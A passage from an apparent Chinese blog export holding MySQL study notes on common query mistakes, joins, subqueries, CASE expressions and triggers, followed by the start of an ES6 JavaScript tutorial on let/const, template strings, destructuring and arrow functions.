<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> actor</span><br><span class="line"><span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;ED&#x27;</span>,<span class="string">&#x27;CHASE&#x27;</span>,<span class="string">&#x27;2006-02-15 12:34:33&#x27;</span>);</span><br></pre></td></tr></table></figure>

























<h2 id="常见错误及注意事项："><a href="#常见错误及注意事项：" class="headerlink" title="常见错误及注意事项："></a>常见错误及注意事项：</h2><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><ol>
<li>聚合函数和group by是同时进行的，一边遍历所有数据进行分组，一边进行聚合函数计算</li>
<li>所有非聚合列必须在 <code>GROUP BY</code> 子句中列出，不能在 <code>GROUP BY</code> 中使用别名。</li>
<li><code>HAVING</code> 可以使用聚合函数，但 <code>WHERE</code> 不能，<code>HAVING</code> 必须在 <code>GROUP BY</code> 之后使用。</li>
<li>可以在 <code>ORDER BY</code> 中使用聚合函数。</li>
</ol>
<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><ol>
<li><p>子查询结果作为表、视图、临时表时必须取别名</p>
</li>
<li><p>子查询可以和父查询联动（<strong>相关子查询（correlated subquery）</strong>），查看错题（3）[子查询] 各部门前n高的成员</p>
</li>
</ol>
<h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><ol>
<li><p><code>IF</code> 语句只能在存储过程、函数、触发器和事件中使用，不能直接在普通的 SQL 查询中使用。</p>
<blockquote>
<p>普通的 SQL 查询中可以使用if(condition,truevalue,falsevalue)代替</p>
</blockquote>
</li>
<li><p><code>CASE</code> 语句可以在 SQL 查询中使用，只能出现在 <code>SELECT</code>、<code>WHERE</code>、<code>HAVING</code> 等 SQL 子句中。</p>
</li>
<li></li>
</ol>
<h3 id="语句结构和顺序"><a href="#语句结构和顺序" class="headerlink" title="语句结构和顺序"></a>语句结构和顺序</h3><p>SELECT 语句的执行顺序（在 MySQL 和 Oracle 中，SELECT 执行顺序基本相同）：<br><code>FROM -&gt; (ON)WHERE -&gt; GROUP BY -&gt; HAVING -&gt; SELECT 的字段 -&gt; DISTINCT -&gt; ORDER BY -&gt; LIMIT</code></p>
<h2 id="其他错题："><a href="#其他错题：" class="headerlink" title="其他错题："></a>其他错题：</h2><p><a href="https://leetcode.cn/problems/product-price-at-a-given-date/">1164. 指定日期的产品价格</a></p>
<p><a href="https://leetcode.cn/problems/reformat-department-table/">1179. 重新格式化部门表</a></p>
<p>1、查询所有部门的名字，location_id，员工数量和平均工资，并按平均工资降序</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 正确</span></span><br><span class="line"><span class="keyword">SELECT</span> department_name, location_id, <span class="built_in">COUNT</span>(employee_id), <span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.`department_id` <span class="operator">=</span> d.`department_id`</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department_name, location_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> avg_sal <span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 错误:这样的count结果中没有员工的部门的结果会是1</span></span><br><span class="line"><span class="keyword">select</span> department_name,location_id,<span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">avg</span>(salary) avg_sal</span><br><span class="line"><span class="keyword">from</span> departments t2 <span class="keyword">left</span> <span class="keyword">join</span> employees t1 </span><br><span class="line"><span class="keyword">on</span> t2.department_id <span class="operator">=</span> t1.department_id </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> department_name,location_id </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> avg_sal <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>

<p>2、查询每个工种、每个部门的部门名、工种名和最低工资</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 正确</span></span><br><span class="line"><span class="keyword">SELECT</span> department_name,job_id,<span class="built_in">MIN</span>(salary)</span><br><span class="line"><span class="keyword">FROM</span> departments d <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> employees e</span><br><span class="line"><span class="keyword">ON</span> e.`department_id` <span class="operator">=</span> d.`department_id`</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department_name,job_id；</span><br><span class="line"><span class="comment">-- 错误：应当以部门为主线</span></span><br><span class="line"><span class="keyword">select</span> department_name,job_title,<span class="built_in">min</span>(salary) </span><br><span class="line"><span class="keyword">from</span> employees t1 <span class="keyword">left</span> <span class="keyword">join</span> departments t2 </span><br><span class="line"><span class="keyword">on</span> t1.department_id <span class="operator">=</span> t2.department_id <span class="keyword">left</span> <span class="keyword">join</span> jobs t3 </span><br><span class="line"><span class="keyword">on</span> t1.job_id <span class="operator">=</span> t3.job_id </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> department_name,job_title;</span><br><span class="line"><span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<p>3.查询平均工资最低的部门信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> d.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> departments d,(</span><br><span class="line"><span class="keyword">SELECT</span> department_id,<span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> avg_sal</span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span>) dept_avg_sal</span><br><span class="line"><span class="keyword">WHERE</span> d.department_id <span class="operator">=</span> dept_avg_sal.department_id</span><br><span class="line"><span class="comment">-- 进阶：查询平均工资最低的部门信息和该部门的平均工资（相关子查询）</span></span><br><span class="line"><span class="keyword">SELECT</span> d.<span class="operator">*</span>,dept_avg_sal.avg_sal</span><br><span class="line"><span class="keyword">FROM</span> departments d,(</span><br><span class="line"><span class="keyword">SELECT</span> department_id,<span class="built_in">AVG</span>(salary) avg_sal</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> avg_sal</span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span>) dept_avg_sal</span><br><span class="line"><span class="keyword">WHERE</span> d.department_id <span class="operator">=</span> dept_avg_sal.department_id</span><br></pre></td></tr></table></figure>

<p>4,查询各部门中工资比本部门平均工资高的员工的员工号, 姓名和工资(难)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary</span><br><span class="line"><span class="keyword">FROM</span> employees e1</span><br><span class="line"><span class="keyword">WHERE</span> salary <span class="operator">&gt;</span> (</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary)</span><br><span class="line"><span class="keyword">FROM</span> employees e2</span><br><span class="line"><span class="keyword">WHERE</span> e2.department_id <span class="operator">=</span> e1.`department_id`</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>5,查询书名和类型，其中note值为 novel显示小说，law显示法律，medicine显示医药，cartoon显示卡通，joke显示笑话</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">AS</span> &quot;书名&quot; ,note, <span class="keyword">CASE</span> note</span><br><span class="line"><span class="keyword">WHEN</span> <span class="string">&#x27;novel&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;小说&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> <span class="string">&#x27;law&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;法律&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> <span class="string">&#x27;medicine&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;医药&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> <span class="string">&#x27;cartoon&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;卡通&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> <span class="string">&#x27;joke&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;笑话&#x27;</span></span><br><span class="line"><span class="keyword">END</span> <span class="keyword">AS</span> &quot;类型&quot;</span><br><span class="line"><span class="keyword">FROM</span> books;</span><br><span class="line"><span class="comment">-- case-when语句不熟悉</span></span><br><span class="line"><span class="comment">-- 查询书名、库存，其中num值超过30本的，显示滞销，大于0并低于10的，显示畅销，为0的显示需要无货</span></span><br><span class="line"><span class="keyword">SELECT</span> name,num,<span class="keyword">CASE</span></span><br><span class="line"><span class="keyword">WHEN</span> num<span class="operator">&gt;</span><span class="number">30</span> <span class="keyword">THEN</span> <span class="string">&#x27;滞销&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> num<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">AND</span> num<span class="operator">&lt;</span><span class="number">10</span> <span class="keyword">THEN</span> <span class="string">&#x27;畅销&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> num<span class="operator">=</span><span class="number">0</span> <span class="keyword">THEN</span> <span class="string">&#x27;无货&#x27;</span></span><br><span class="line"><span class="keyword">ELSE</span> <span class="string">&#x27;正常&#x27;</span></span><br><span class="line"><span class="keyword">END</span> <span class="keyword">AS</span> &quot;库存状态&quot;</span><br><span class="line"><span class="keyword">FROM</span> books</span><br></pre></td></tr></table></figure>

<p>6,<code>ifnull</code>和<code>with rollup</code>:统计每一种note的库存量，并合计总量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IFNULL(note,<span class="string">&#x27;合计总库存量&#x27;</span>) <span class="keyword">AS</span> note,<span class="built_in">SUM</span>(num) <span class="keyword">FROM</span> books <span class="keyword">GROUP</span> <span class="keyword">BY</span> note <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>;</span><br></pre></td></tr></table></figure>

<p>7,<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240808173328.png" alt="游标的使用"></p>
<p>8,复制一张只有表结构的空表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emps_back <span class="keyword">as</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emps <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>9,创建触发器emps_insert_trigger，每当向emps表中添加一条记录时，同步将这条记录添加到emps_back表中，当前emps_back为空表但emps表中已经有多条数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> emps_insert_trigger</span><br><span class="line">AFTER <span class="keyword">INSERT</span> <span class="keyword">ON</span> emps</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emps_back(employee_id,last_name,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(NEW.employee_id,NEW.last_name,NEW.salary);</span><br><span class="line"><span class="keyword">end</span> $$</span><br></pre></td></tr></table></figure>

<p>10,创建触发器emps_del_trigger，每当向emps表中删除一条记录时，同步将删除的这条记录添加到emps_back1表中</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> emps_del_trigger</span><br><span class="line">BEFORE <span class="keyword">DELETE</span> <span class="keyword">ON</span> emps</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emps_back1(employee_id,last_name,salary)</span><br><span class="line"><span class="keyword">VALUES</span>(OLD.employee_id,OLD.last_name,OLD.salary);</span><br><span class="line"><span class="keyword">end</span> $$</span><br></pre></td></tr></table></figure>

<p>11.<a href="https://www.nowcoder.com/practice/88aa923a9a674253b861a8fa56bac8e5?tpId=199&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/oj?page=1&tab=SQL%25E7%25AF%2587&topicId=199">牛客网-MySQL练习</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">    university,</span><br><span class="line">    <span class="built_in">count</span>(question_id) <span class="operator">/</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> qpd.device_id) <span class="keyword">as</span> avg_answer_cnt</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">    question_practice_detail <span class="keyword">as</span> qpd</span><br><span class="line">    <span class="keyword">inner</span> <span class="keyword">join</span> user_profile <span class="keyword">as</span> up <span class="keyword">on</span> qpd.device_id <span class="operator">=</span> up.device_id</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">    university</span><br></pre></td></tr></table></figure>

<p><a href="https://www.nowcoder.com/practice/5400df085a034f88b2e17941ab338ee8?tpId=199&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/oj?page=1&tab=SQL%25E7%25AF%2587&topicId=199">牛客错题1</a><br><a href="https://www.nowcoder.com/practice/126083961ae0415fbde061d7ebbde453?tpId=199&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/oj?page=1&tab=SQL%25E7%25AF%2587&topicId=199">牛客错题2</a></p>
]]></content>
      <categories>
        <category>缓存与数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-Vue-Note</title>
    <url>/2025/01/19/JavaWeb-Vue-Note/</url>
    <content><![CDATA[<h1 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h1><p>ES6，全称为ECMAScript 2015，是JavaScript语言的一个重要版本更新。它引入了许多新特性，旨在提高代码的可读性、简洁性和开发效率。主要是ES6的一些关键特性和改进：</p>
<h2 id="变量和模板字符串"><a href="#变量和模板字符串" class="headerlink" title="变量和模板字符串"></a>变量和模板字符串</h2><h3 id="let-和-const"><a href="#let-和-const" class="headerlink" title="let 和 const"></a><strong>let 和 const</strong></h3><p>ES6新增了两种声明变量的方式</p>
<ul>
<li>**<code>let</code>**：用于声明块级作用域的变量，解决了<code>var</code>声明变量时存在的变量提升问题。</li>
<li>**<code>const</code>**：用于声明常量，一旦赋值就不能再改变。对于对象和数组，虽然不能重新赋值，但可以修改其内容。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> list = [<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="string">&quot;cccc&quot;</span>];</span><br><span class="line">list = [<span class="string">&quot;ccc&quot;</span>,<span class="string">&quot;dddd&quot;</span>]               <span class="comment">// 不可以，指向了新的数组</span></span><br><span class="line">list.<span class="title function_">push</span>(<span class="string">&quot;dddd&quot;</span>)            		<span class="comment">// 可以</span></span><br><span class="line"><span class="comment">// 类似于Java中不能改变指向的地址，但指向地址中的数据是可以修改的</span></span><br></pre></td></tr></table></figure>



<p><code>let</code>和<code>var</code>声明的区别：<strong>能用let用let</strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th><code>var</code></th>
<th><code>let</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong>作用域</strong></td>
<td>函数作用域或全局作用域</td>
<td>块作用域，即单纯的{}也会限制其作用域</td>
</tr>
<tr>
<td><strong>变量提升</strong></td>
<td>提升到作用域顶部，值为 <code>undefined</code><br>即在作用域内可以先访问后声明，<br>先访问时为 <code>undefined</code></td>
<td>暂时性死区，未声明前不可访问</td>
</tr>
<tr>
<td><strong>重复声明</strong></td>
<td>允许</td>
<td>不允许，会抛出语法错误</td>
</tr>
<tr>
<td><strong>全局对象属性</strong></td>
<td>成为全局对象(windows)的属性</td>
<td>不成为全局对象(windows)的属性</td>
</tr>
<tr>
<td><strong>循环中的行为</strong></td>
<td>共享同一变量</td>
<td>每次迭代创建新的变量实例</td>
</tr>
<tr>
<td><strong>函数作用域 vs 块作用域</strong></td>
<td>只受函数作用域影响</td>
<td>受函数作用域和块作用域影响</td>
</tr>
</tbody></table>
<h3 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h3><p>模板字符串是ES6引入的一种新特性，使用反引号（<code>`</code>）包裹的字符串可以包含嵌入表达式。它们使得字符串拼接和多行文本处理变得更加简洁和直观。以下是模板字符串的主要特点和用法。</p>
<p><strong>主要特点</strong></p>
<ol>
<li><p><strong>嵌入表达式</strong>：使用 <code>$&#123;expression&#125;</code> 语法在字符串中嵌入JavaScript表达式。</p>
</li>
<li><p><strong>多行字符串</strong>：可以直接在模板字符串中写多行文本，而不需要使用换行符 <code>\n</code> 或者字符串连接操作符 <code>+</code>。</p>
</li>
<li><p><strong>简化字符串拼接</strong>：不需要再使用字符串连接操作符 <code>+</code> 来拼接变量和字符串。</p>
</li>
</ol>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><h5 id="1-嵌入表达式"><a href="#1-嵌入表达式" class="headerlink" title="1. 嵌入表达式"></a>1. <strong>嵌入表达式</strong></h5><p>可以在模板字符串中嵌入任何有效的JavaScript表达式，包括变量、函数调用等。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> age = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用模板字符串嵌入变量</span></span><br><span class="line"><span class="keyword">let</span> greeting = <span class="string">`Hello, my name is <span class="subst">$&#123;name&#125;</span> and I am <span class="subst">$&#123;age&#125;</span> years old.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greeting); <span class="comment">// 输出: Hello, my name is Alice and I am 25 years old.</span></span><br></pre></td></tr></table></figure>

<h5 id="2-嵌入函数调用"><a href="#2-嵌入函数调用" class="headerlink" title="2. 嵌入函数调用"></a>2. <strong>嵌入函数调用</strong></h5><p>也可以在模板字符串中嵌入函数调用的结果。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getGreeting</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> message = <span class="string">`This is a <span class="subst">$&#123;getGreeting()&#125;</span> message.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// 输出: This is a Welcome! message.</span></span><br></pre></td></tr></table></figure>

<h5 id="3-多行字符串"><a href="#3-多行字符串" class="headerlink" title="3. 多行字符串"></a>3. <strong>多行字符串</strong></h5><p>模板字符串支持直接编写多行文本，无需使用换行符 <code>\n</code> 或者字符串连接操作符 <code>+</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> multiLine = <span class="string">`This is a </span></span><br><span class="line"><span class="string">multi-line</span></span><br><span class="line"><span class="string">string.`</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(multiLine);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出:</span></span><br><span class="line"><span class="comment">This is a </span></span><br><span class="line"><span class="comment">multi-line</span></span><br><span class="line"><span class="comment">string.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>





<h2 id="解构表达式"><a href="#解构表达式" class="headerlink" title="解构表达式"></a>解构表达式</h2><p>解构赋值是ES6引入的一种简洁的语法，用于从数组或对象中提取数据，并将这些数据赋值给变量。它使得代码更加简洁和易读，特别是在处理复杂的数据结构时。</p>
<h3 id="数组解构"><a href="#数组解构" class="headerlink" title="数组解构"></a>数组解构</h3><p>数组解构允许从数组中提取元素并直接赋值给变量。</p>
<h4 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>];</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = arr;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 输出: 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 输出: 20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">// 输出: 30</span></span><br></pre></td></tr></table></figure>

<h4 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h4><p>如果数组中的某些元素不存在，可以为变量指定默认值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>];</span><br><span class="line"><span class="keyword">let</span> [a, b = <span class="number">20</span>, c = <span class="number">30</span>] = arr;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 输出: 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 输出: 20 (使用默认值)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">// 输出: 30 (使用默认值)</span></span><br></pre></td></tr></table></figure>

<h4 id="不完整解构"><a href="#不完整解构" class="headerlink" title="不完整解构"></a>不完整解构</h4><p>可以选择只解构部分数组元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>];</span><br><span class="line"><span class="keyword">let</span> [a, , c] = arr; <span class="comment">// 跳过第二个元素</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 输出: 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">// 输出: 30</span></span><br></pre></td></tr></table></figure>

<h3 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h3><p>对象解构允许从对象中提取属性并将其赋值给同名变量。</p>
<h4 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123; <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">age</span>: <span class="number">25</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; name, age &#125; = person;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// 输出: Alice</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);  <span class="comment">// 输出: 25</span></span><br></pre></td></tr></table></figure>

<h4 id="重命名变量"><a href="#重命名变量" class="headerlink" title="重命名变量"></a>重命名变量</h4><p>可以通过在解构表达式中指定新的变量名来重命名提取的属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123; <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">age</span>: <span class="number">25</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">name</span>: fullName, <span class="attr">age</span>: years &#125; = person;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fullName); <span class="comment">// 输出: Alice</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(years);   <span class="comment">// 输出: 25</span></span><br></pre></td></tr></table></figure>

<h4 id="默认值-1"><a href="#默认值-1" class="headerlink" title="默认值"></a>默认值</h4><p>可以为解构的属性指定默认值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123; <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; name, age = <span class="number">25</span> &#125; = person;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// 输出: Alice</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);  <span class="comment">// 输出: 25 (使用默认值)</span></span><br></pre></td></tr></table></figure>

<h3 id="嵌套解构"><a href="#嵌套解构" class="headerlink" title="嵌套解构"></a>嵌套解构</h3><p>对于嵌套的对象或数组，你可以进行嵌套解构。</p>
<h4 id="嵌套对象解构"><a href="#嵌套对象解构" class="headerlink" title="嵌套对象解构"></a>嵌套对象解构</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>,</span><br><span class="line">    <span class="attr">address</span>: &#123;</span><br><span class="line">        <span class="attr">city</span>: <span class="string">&quot;Wonderland&quot;</span>,</span><br><span class="line">        <span class="attr">zip</span>: <span class="string">&quot;12345&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; name, <span class="attr">address</span>: &#123; city, zip &#125; &#125; = person;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// 输出: Alice</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(city); <span class="comment">// 输出: Wonderland</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zip);  <span class="comment">// 输出: 12345</span></span><br></pre></td></tr></table></figure>

<h4 id="嵌套数组解构"><a href="#嵌套数组解构" class="headerlink" title="嵌套数组解构"></a>嵌套数组解构</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nestedArray = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>], <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> [a, [b, c], d] = nestedArray;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 输出: 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 输出: 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">// 输出: 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d); <span class="comment">// 输出: 4</span></span><br></pre></td></tr></table></figure>

<h3 id="函数参数解构"><a href="#函数参数解构" class="headerlink" title="函数参数解构"></a>函数参数解构</h3><p>可以在函数参数中使用解构赋值，从而直接从传入的对象或数组中提取所需的值。</p>
<h4 id="对象参数解构"><a href="#对象参数解构" class="headerlink" title="对象参数解构"></a>对象参数解构</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printPerson</span>(<span class="params">&#123; name, age &#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;name&#125;</span>, Age: <span class="subst">$&#123;age&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person = &#123; <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">age</span>: <span class="number">25</span> &#125;;</span><br><span class="line"><span class="title function_">printPerson</span>(person); <span class="comment">// 输出: Name: Alice, Age: 25</span></span><br></pre></td></tr></table></figure>

<h4 id="数组参数解构"><a href="#数组参数解构" class="headerlink" title="数组参数解构"></a>数组参数解构</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">[a, b]</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> numbers = [<span class="number">10</span>, <span class="number">20</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(numbers)); <span class="comment">// 输出: 30</span></span><br></pre></td></tr></table></figure>







<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>基本和Java中的lambda表达式，只是<code>-&gt;</code>换成了<code>=&gt;</code></p>
<p>箭头函数是ES6引入的一种新的函数定义方式，它提供了更加简洁的语法，并且在处理 <code>this</code> 关键字时有一些不同的行为(箭头函数没有自己的this，它的this是外层环境中的this) 。箭头函数非常适合用于编写短小、简单的函数表达式。</p>
<p>下是箭头函数的主要特点和优势：</p>
<ol>
<li><p><strong>简洁的语法</strong>：</p>
<ul>
<li>单行表达式可以直接返回结果，无需 <code>return</code> 关键字。</li>
<li>参数较少时可以省略括号。</li>
</ul>
</li>
<li><p><strong>固定的 <code>this</code> 上下文</strong>：</p>
<ul>
<li>箭头函数内部的 <code>this</code> 继承自外层作用域，不会随着函数调用方式而改变。</li>
</ul>
</li>
